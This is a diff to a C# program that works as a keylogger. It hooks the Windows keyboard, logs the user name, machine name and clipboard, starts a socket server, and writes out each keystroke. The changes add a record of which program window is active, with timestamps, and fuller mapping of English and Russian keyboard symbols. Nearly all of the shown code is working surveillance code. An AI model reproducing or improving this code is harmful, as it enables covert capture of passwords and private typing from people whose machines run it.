@@ -14,6 +14,8 @@ using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Security.Permissions;
 
+
+
 namespace ConsoleApp2
 {
     class Program
@@ -115,13 +117,13 @@ namespace ConsoleApp2
 
              */
 
-            Writer("\n========================================\n\nCurrentDirectory: {0}" + Environment.CurrentDirectory + "\n");
+            Writer("\n========================================================================================================================\n\nCurrentDirectory: {0}" + Environment.CurrentDirectory + "\n");
             Writer("MachineName: {0}" + Environment.MachineName + "\n");
             Writer("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n");
             Writer("SystemDirectory: {0}" + Environment.SystemDirectory + "\n");
             Writer("UserDomainName: {0}" + Environment.UserDomainName + "\n");
             Writer("UserInteractive: {0}" + Environment.UserInteractive + "\n");
-            Writer("UserName: {0}" + Environment.UserName + "\n");
+            Writer("UserName: {0}" + Environment.UserName + "\n\n========================================================================================================================\n\n");
 
 
             //  Writer(Decrypt(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"), "Key"));
@@ -144,7 +146,7 @@ namespace ConsoleApp2
             mss = lang.ToString();
             //  Console.WriteLine("Первоначальная раскладка: {0}\n", lang.ToString());
             // Writer(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));
-            Writer("original keyboard layout: " + mss + "\n");
+            Writer("Original keyboard layout: " + mss + "\n");
             Thread mtr = new System.Threading.Thread(ServerSocket);
             mtr.Start();
             Application.Run();
@@ -165,19 +167,33 @@ namespace ConsoleApp2
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+
+      static string PreviousProgram="";
+
         private static IntPtr HookCallback(int nCode,IntPtr wParam, IntPtr lParam)
         {
+         
             if (nCode >= 0)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
+                string CurrentProgram = GetActiveWindowTitle();
+                if (!CurrentProgram.Equals(PreviousProgram))
+                {
+                    PreviousProgram = CurrentProgram;
+                    string time = DateTime.Now.ToString();
+                    Writer("\n\t[Program: " + CurrentProgram + "\n\tDateTime: " + time + "]\n");
+                 //   Console.WriteLine("[Program: " + CurrentProgram + "  DateTime: " + time + "]\n");
+                }
+
 
                 KeysConverter kc = new KeysConverter();
+
                 string mystring = kc.ConvertToString((Keys)vkCode);
 
                 string original = mystring;
                 string encrypted;
 
-               
+               ///
                 bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                 bool sh = Control.ModifierKeys != Keys.Shift;
                 
@@ -221,7 +237,7 @@ namespace ConsoleApp2
                     }
 
                     //Writer(Encrypt(original, "Key"));
-                  // if(original.Length==1)
+                   if(original.Length==1)
                     Writer(original);
                     
                 }
@@ -257,24 +273,173 @@ namespace ConsoleApp2
                         Writer("<backspace>");
                     }
 
-                    if(Keys.OemOpenBrackets == (Keys)vkCode)
+                    if(Keys.OemOpenBrackets == (Keys)vkCode )
                     {
-                        Writer("[");
-                    }
+                        char sym;
+                        if (lang_check == 1033 || lang_check ==0)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer("{"); }
+                            else Writer("[");
+                        }
+                        else if (lang_check == 1049)
+                        {
+                            sym = 'Х';
+                            if (capsLock)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            if (sh)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            Writer(sym.ToString());
+                        }
 
-                    if(Keys.OemOpenBrackets == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
-                    {
-                        Writer("{");
+                       
                     }
 
                     if (Keys.OemCloseBrackets == (Keys)vkCode)
                     {
-                        Writer("]");
+                        char sym;
+                        if (lang_check == 1033 || lang_check == 0)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer("}"); }
+                            else Writer("]");
+                        }
+                        else if (lang_check == 1049)
+                        {
+                            sym = 'Ъ';
+                            if (capsLock)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            if (sh)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            Writer(sym.ToString());
+                        }
+
+
                     }
 
-                    if (Keys.OemCloseBrackets == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
+                  
+
+                    if (Keys.Oem5 == (Keys)vkCode && Keys.Shift != Control.ModifierKeys)
                     {
-                        Writer("}");
+                        Writer("\\");
+                    }
+
+                    if (Keys.Oem5 == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
+                    {
+                        Writer("|");
+                    } 
+
+              
+                    if (Keys.Oem7 == (Keys)vkCode)
+                    {
+                        char sym;
+                        if (lang_check == 1033 || lang_check == 0)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer("\""); }
+                            else Writer("'");
+                        }
+                        else if (lang_check == 1049)
+                        {
+                            sym = 'Э';
+                            if (capsLock)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            if (sh)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            Writer(sym.ToString());
+                        }
+                    }
+                    if (Keys.Oem1 == (Keys)vkCode)
+                    {
+                        char sym;
+                        if (lang_check == 1033 || lang_check == 0)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer(":"); }
+                            else Writer(";");
+                        }
+                        else if (lang_check == 1049)
+                        {
+                            sym = 'Ж';
+                            if (capsLock)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            if (sh)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            Writer(sym.ToString());
+                        }
+                    }
+
+                    if (Keys.OemQuestion == (Keys)vkCode)
+                    {
+                      
+                        if (lang_check == 1033 || lang_check == 0)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer("?"); }
+                            else Writer("/");
+                        }
+                        else if (lang_check == 1049)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer(","); }
+                            else Writer(".");
+                        }
+                    }
+
+                    if (Keys.OemPeriod == (Keys)vkCode)
+                    {
+                        char sym;
+                        if (lang_check == 1033 || lang_check == 0)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer(">"); }
+                            else Writer(".");
+                        }
+                        else if (lang_check == 1049)
+                        {
+                            sym = 'Ю';
+                            if (capsLock)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            if (sh)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            Writer(sym.ToString());
+                        }
+                    }
+
+                    if (Keys.Oemcomma == (Keys)vkCode)
+                    {
+                        char sym;
+                        if (lang_check == 1033 || lang_check == 0)
+                        {
+                            if (Keys.Shift == Control.ModifierKeys) { Writer("<"); }
+                            else Writer(",");
+                        }
+                        else if (lang_check == 1049)
+                        {
+                            sym = 'Б';
+                            if (capsLock)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            if (sh)
+                            {
+                                sym = ChangeRegister(sym)[0];
+                            }
+                            Writer(sym.ToString());
+                        }
                     }
 
                 }
@@ -357,10 +522,7 @@ namespace ConsoleApp2
                 }
 
             //    Console.WriteLine("Original:   {0}", original);
-
             }
-
-
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
@@ -370,9 +532,6 @@ namespace ConsoleApp2
             string htmlData = Clipboard.GetText(TextDataFormat.UnicodeText);
             return htmlData;
         }
-
-
-
 
 
         // Записываем шифрованный текст в файл
@@ -472,12 +631,19 @@ namespace ConsoleApp2
         }
 
 
+        private static string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
 
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
 
-
-        ///////////////////////////////////////////////////////////////////
-        ////////////////////////////библиотеки/////////////////////////////
-        ///////////////////////////////////////////////////////////////////
 
 
 
@@ -525,6 +691,8 @@ namespace ConsoleApp2
             [In] int idThread
             );
 
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         static ushort GetKeyboardLayout()
         {
